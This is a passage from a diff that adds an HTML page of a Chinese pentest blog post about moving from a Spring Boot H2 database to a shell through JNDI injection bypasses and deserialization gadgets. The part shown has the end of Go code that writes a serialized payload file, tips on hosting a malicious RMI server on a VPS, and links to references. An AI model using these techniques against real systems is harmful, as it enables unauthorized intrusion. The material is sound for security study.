+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+	ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
+<li>RMI托管在VPS的时候，修改<a target="_blank" rel="noopener" href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>为自己服务器的IP地址</li>
+<li>在完全黑盒的情况下，注意SerialVersionUID不匹配的问题，具体见<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://81.68.118.217/index.php/archives/62/">JNDI注入高版本绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li>
+<li><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1575">ysoserial 工具改造</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar">zkar</a></li>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2022/03/18/from-spring-boot-to-getshell.html" class="leancloud-visitors view" data-flag-title="从Spring Boot H2 Database到GetShell">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/08/06/windows-ntlm-smb-scan.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-03-18 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x1-%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-article-text">0x1. 切入点</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x2-%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x2. 绕过和利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory%E7%BB%95%E8%BF%87"><span class="toc-article-text">利用本地Class作为Reference Factory绕过</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Snkeyml"><span class="toc-article-text">Snkeyml</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mvel"><span class="toc-article-text">Mvel</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget%E7%BB%95%E8%BF%87"><span class="toc-article-text">利用LDAP返回反序列化数据，触发本地Gadget绕过</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">注意事项</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83"><span class="toc-article-text">参考</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
